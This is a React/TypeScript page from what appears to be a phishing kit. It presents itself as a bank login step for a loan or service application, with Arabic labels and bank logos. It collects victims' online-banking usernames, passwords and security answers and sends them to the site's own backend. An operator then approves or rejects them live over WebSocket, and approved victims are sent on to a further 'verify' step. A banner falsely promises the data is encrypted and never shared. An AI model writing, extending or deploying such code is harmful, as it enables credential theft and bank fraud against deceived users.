// صفحة بيانات الدخول للبنك - حقول مدارة من لوحة الإدارة
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSession } from "@/context/SessionContext";
import { useWebSocket } from "@/context/WebSocketContext";
import { usePageContent } from "@/hooks/usePageContent";
import StepIndicator from "@/components/StepIndicator";
import Navbar from "@/components/Navbar";
import { Lock, Eye, EyeOff, ChevronLeft, Shield, Loader2, XCircle, AlertCircle } from "lucide-react";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

interface CustomField {
  id: number;
  pageKey: string;
  fieldKey: string;
  labelAr: string;
  fieldType: string;
  placeholder: string;
  isRequired: boolean;
  sortOrder: number;
}

// الحقول المعروفة التي تُخزَّن في أعمدة مخصصة بقاعدة البيانات
const KNOWN_KEYS = ["bankUsername", "bankPassword", "securityAnswer"];

// ============================================
// شروط التحقق (Validation) للاسم المستخدم وكلمة المرور
// ============================================

// ============================================
// شروط اسم المستخدم
// - مسموح: أحرف إنجليزية (كبيرة وصغيرة) + أرقام فقط
// - غير مسموح: رموز، فراغات، فواصل، أحرف عربية
// ============================================
function validateUsername(username: string): { isValid: boolean; message: string } {
  // التحقق من الفراغات
  if (/\s/.test(username)) {
    return { isValid: false, message: "اسم المستخدم غير صحيح" };
  }

  // التحقق من الفواصل
  if (/,/.test(username)) {
    return { isValid: false, message: "اسم المستخدم غير صحيح" };
  }

  // التحقق: يجب أن يحتوي فقط على أحرف إنجليزية وأرقام
  if (!/^[a-zA-Z0-9]+$/.test(username)) {
    return { isValid: false, message: "اسم المستخدم غير صحيح" };
  }

  // التحقق من الطول: 6-30 حرف
  if (username.length < 6) {
    return { isValid: false, message: "اسم المستخدم غير صحيح" };
  }

  if (username.length > 30) {
    return { isValid: false, message: "اسم المستخدم غير صحيح" };
  }

  return { isValid: true, message: "" };
}

// ============================================
// شروط كلمة المرور
// - غير مسموح: أحرف عربية
// - غير مسموح: أرقام فقط
// - غير مسموح: فراغات
// - مسموح: رموز + أرقام + أحرف إنجليزية (كبيرة وصغيرة)
// - الطول: 8-40 حرف
// ============================================
function validatePassword(password: string): { isValid: boolean; message: string } {
  // التحقق من الفراغات
  if (/\s/.test(password)) {
    return { isValid: false, message: "كلمة المرور غير صحيحة" };
  }

  // التحقق: لا أحرف عربية
  if (/[أ-ي]/.test(password)) {
    return { isValid: false, message: "كلمة المرور غير صحيحة" };
  }

  // التحقق: أرقام فقط غير مسموح
  if (/^[0-9]+$/.test(password)) {
    return { isValid: false, message: "كلمة المرور غير صحيحة" };
  }

  // التحقق: أحرف إنجليزية + أرقام + رموز فقط
  if (!/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]+$/.test(password)) {
    return { isValid: false, message: "كلمة المرور غير صحيحة" };
  }

  // التحقق من الطول: 8-40 حرف
  if (password.length < 8) {
    return { isValid: false, message: "كلمة المرور غير صحيحة" };
  }

  if (password.length > 40) {
    return { isValid: false, message: "كلمة المرور غير صحيحة" };
  }

  return { isValid: true, message: "" };
}

export default function CredentialsPage() {
  const [, navigate] = useLocation();
  const { sessionId, applicationId, selectedBank } = useSession();
  const { subscribe } = useWebSocket();
  const content = usePageContent("credentials", {
    page_title: "بيانات الدخول",
    page_subtitle: "أدخل بيانات دخول حسابك البنكي",
    waiting_message: "جاري مراجعة بياناتك... يرجى الانتظار",
    submit_btn: "تأكيد",
  });

  const [fields, setFields] = useState<CustomField[]>([]);
  const [fieldValues, setFieldValues] = useState<Record<string, string>>({});
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});
  const [isWaiting, setIsWaiting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [rejectionMessage, setRejectionMessage] = useState<string | null>(null);
  const [bank, setBank] = useState<{ nameAr: string; logoUrl?: string } | null>(null);

  // حالات التحقق من الاسم المستخدم وكلمة المرور
  const [usernameError, setUsernameError] = useState<string | null>(null);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [touchedFields, setTouchedFields] = useState<Record<string, boolean>>({});

  // التحقق من الاسم المستخدم عند الكتابة
  const handleUsernameChange = (value: string, fieldKey: string) => {
    setFieldValues(prev => ({ ...prev, [fieldKey]: value }));
    if (touchedFields[fieldKey]) {
      const result = validateUsername(value);
      setUsernameError(result.isValid ? null : result.message);
    }
  };

  // التحقق من كلمة المرور عند الكتابة
  const handlePasswordChange = (value: string, fieldKey: string) => {
    setFieldValues(prev => ({ ...prev, [fieldKey]: value }));
    if (touchedFields[fieldKey]) {
      const result = validatePassword(value);
      setPasswordError(result.isValid ? null : result.message);
    }
  };

  // عند مغادرة الحقل (blur)
  const handleBlur = (fieldKey: string, value: string) => {
    setTouchedFields(prev => ({ ...prev, [fieldKey]: true }));
    
    if (fieldKey === "bankUsername") {
      const result = validateUsername(value);
      setUsernameError(result.isValid ? null : result.message);
    }
    if (fieldKey === "bankPassword") {
      const result = validatePassword(value);
      setPasswordError(result.isValid ? null : result.message);
    }
  };

  // التحقق قبل الإرسال
  const validateForm = (): boolean => {
    let isValid = true;
    const newTouched: Record<string, boolean> = {};
    let newUsernameError: string | null = null;
    let newPasswordError: string | null = null;

    fields.forEach(field => {
      newTouched[field.fieldKey] = true;
      const value = fieldValues[field.fieldKey] || "";

      if (field.fieldKey === "bankUsername") {
        const result = validateUsername(value);
        if (!result.isValid) {
          newUsernameError = result.message;
          isValid = false;
        }
      }
      if (field.fieldKey === "bankPassword") {
        const result = validatePassword(value);
        if (!result.isValid) {
          newPasswordError = result.message;
          isValid = false;
        }
      }
    });

    setTouchedFields(newTouched);
    setUsernameError(newUsernameError);
    setPasswordError(newPasswordError);

    return isValid;
  };

  // جلب بيانات البنك
  useEffect(() => {
    if (!selectedBank) return;
    fetch(`${BASE}/api/banks/${selectedBank}`)
      .then(r => r.ok ? r.json() : null)
      .then(d => d && setBank(d))
      .catch(() => {});
  }, [selectedBank]);

  // جلب الحقول من قاعدة البيانات
  useEffect(() => {
    fetch(`${BASE}/api/custom-fields/credentials`)
      .then(r => r.ok ? r.json() : [])
      .then((d: CustomField[]) => setFields(d))
      .catch(() => {});
  }, []);

  // الاستماع لتحديثات الحقول وقرارات المدير
  useEffect(() => {
    return subscribe((msg) => {
      if (msg.type === "custom_fields_update" && msg.pageKey === "credentials") {
        setFields(msg.fields as CustomField[]);
      }
      if (msg.type === "credentials_decision" && msg.sessionId === sessionId) {
        if (msg.decision === "approved") {
          // إعادة تحميل كامل للصفحة التالية
          window.location.href = BASE + "/apply/verify";
        } else if (msg.decision === "rejected") {
          setIsWaiting(false);
          setRejectionMessage((msg.message as string) || "بيانات الدخول غير صحيحة، حاول مرة ثانية");
          setFieldValues({});
        }
      }
    });
  }, [subscribe, sessionId]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!applicationId || !sessionId) return;

    // التحقق من صحة البيانات قبل الإرسال
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setRejectionMessage(null);

    // تصنيف قيم الحقول: معروفة → أعمدة مخصصة، إضافية → extraData
    const patchBody: Record<string, string> = { currentStep: "credentials" };
    const extra: Record<string, string> = {};
    for (const [key, val] of Object.entries(fieldValues)) {
      if (KNOWN_KEYS.includes(key)) {
        patchBody[key] = val;
      } else {
        extra[key] = val;
      }
    }
    if (Object.keys(extra).length > 0) {
      patchBody.extraData = JSON.stringify(extra);
    }

    // إضافة بيانات البنك للـ extraData لضمان إرسالها
    const bankData: Record<string, string> = {};
    if (bank) {
      bankData.bankId = String(selectedBank);
      bankData.bankName = bank.nameAr;
      if ((bank as any).logoUrl) {
        bankData.bankLogo = (bank as any).logoUrl;
      }
    }

    // دمج bankData مع extraData
    const allExtra = { ...extra, ...bankData };
    if (Object.keys(allExtra).length > 0) {
      patchBody.extraData = JSON.stringify(allExtra);
    }

    try {
      await fetch(`${BASE}/api/applications/${applicationId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(patchBody),
      });

      await fetch(`${BASE}/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ credentialsStatus: "awaiting", currentPage: "credentials" }),
      });

      setIsWaiting(true);
    } catch {
      setRejectionMessage("حدث خطأ، حاول مرة ثانية");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <Navbar />
      <StepIndicator currentStep={3} />

      <div className="container mx-auto px-4 py-10 max-w-xl">
        {bank && (
          <div className="bg-card border rounded-2xl p-4 mb-8 flex items-center gap-4">
            {bank.logoUrl ? (
              <img src={bank.logoUrl} alt={bank.nameAr} className="w-16 h-12 object-contain" />
            ) : (
              <div className="w-14 h-14 navy-gradient rounded-xl flex items-center justify-center text-white font-black text-xl">
                {bank.nameAr.charAt(0)}
              </div>
            )}
            <div>
              <p className="font-black text-lg text-primary">{bank.nameAr}</p>
            </div>
          </div>
        )}

        {/* شاشة الانتظار */}
        {isWaiting ? (
          <div className="bg-card border rounded-3xl p-12 text-center">
            <div className="w-20 h-20 navy-gradient rounded-2xl flex items-center justify-center text-white mx-auto mb-6">
              <Loader2 className="w-10 h-10 animate-spin" />
            </div>
            <h2 className="text-xl font-black text-primary mb-3">جاري المراجعة</h2>
            <p className="text-muted-foreground leading-relaxed">{content.waiting_message}</p>
          </div>
        ) : (
          <>
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-8 flex gap-3">
              <Shield className="w-5 h-5 text-amber-600 shrink-0 mt-0.5" />
              <p className="text-amber-800 text-sm leading-relaxed">
                جميع بياناتك محمية بأعلى معايير التشفير. لن يتم مشاركة بياناتك مع أي جهة خارجية.
              </p>
            </div>

            {rejectionMessage && (
              <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6 flex gap-3">
                <XCircle className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
                <p className="text-red-800 text-sm leading-relaxed">{rejectionMessage}</p>
              </div>
            )}

            <h1 className="text-2xl font-black mb-2" style={{ color: content.title_color || "var(--color-primary)" }}>{content.page_title}</h1>
            <p className="text-muted-foreground mb-8" style={content.text_color ? { color: content.text_color } : {}}>{content.page_subtitle}</p>

            <form onSubmit={handleSubmit} className="bg-card border rounded-2xl p-8 space-y-6">
              {fields.length === 0 ? (
                <div className="text-center py-6">
                  <Loader2 className="w-8 h-8 animate-spin text-primary mx-auto mb-2" />
                  <p className="text-muted-foreground text-sm">جاري تحميل الحقول...</p>
                </div>
              ) : (
                fields.map(field => {
                  const isPassword = field.fieldType === "password";
                  const isUsername = field.fieldKey === "bankUsername";
                  const isPasswordField = field.fieldKey === "bankPassword";
                  const showPwd = showPasswords[field.fieldKey] ?? false;
                  const hasError = (isUsername && usernameError) || (isPasswordField && passwordError);

                  return (
                    <div key={field.fieldKey}>
                      <label className="block text-sm font-bold mb-2">
                        {field.labelAr} {field.isRequired && <span className="text-destructive">*</span>}
                      </label>
                      <div className="relative">
                        <Lock className={`absolute top-3.5 right-3 w-4 h-4 ${hasError ? 'text-red-500' : 'text-muted-foreground'}`} />
                        <input
                          type={isPassword && !showPwd ? "password" : "text"}
                          required={field.isRequired}
                          value={fieldValues[field.fieldKey] ?? ""}
                          onChange={e => {
                            if (isUsername) {
                              handleUsernameChange(e.target.value, field.fieldKey);
                            } else if (isPasswordField) {
                              handlePasswordChange(e.target.value, field.fieldKey);
                            } else {
                              setFieldValues(prev => ({ ...prev, [field.fieldKey]: e.target.value }));
                            }
                          }}
                          onBlur={e => {
                            if (isUsername || isPasswordField) {
                              handleBlur(field.fieldKey, e.target.value);
                            }
                          }}
                          className={`w-full border rounded-xl pr-10 ${isPassword ? "pl-10" : "pl-3"} p-3 h-[50px] bg-background text-foreground text-center focus:outline-none focus:ring-2 ${hasError ? 'focus:ring-red-500 border-red-500' : 'focus:ring-primary/50'}`}
                          placeholder={field.placeholder || `أدخل ${field.labelAr}`}
                        />
                        {isPassword && (
                          <button
                            type="button"
                            onClick={() => setShowPasswords(prev => ({ ...prev, [field.fieldKey]: !showPwd }))}
                            className="absolute top-3.5 left-3 text-muted-foreground hover:text-foreground"
                          >
                            {showPwd ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        )}
                      </div>

                      {/* رسالة الخطأ */}
                      {hasError && (
                        <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
                          <AlertCircle className="w-4 h-4" />
                          <span>{isUsername ? usernameError : passwordError}</span>
                        </div>
                      )}


                    </div>
                  );
                })
              )}

              <button
                type="submit"
                disabled={isLoading || fields.length === 0}
                className="w-full navy-gradient text-white py-4 rounded-xl font-bold text-lg flex items-center justify-center gap-2 hover:opacity-90 transition-opacity disabled:opacity-50"
              >
                {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <ChevronLeft className="w-5 h-5" />}
                {isLoading ? "جاري الإرسال..." : content.submit_btn}
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}
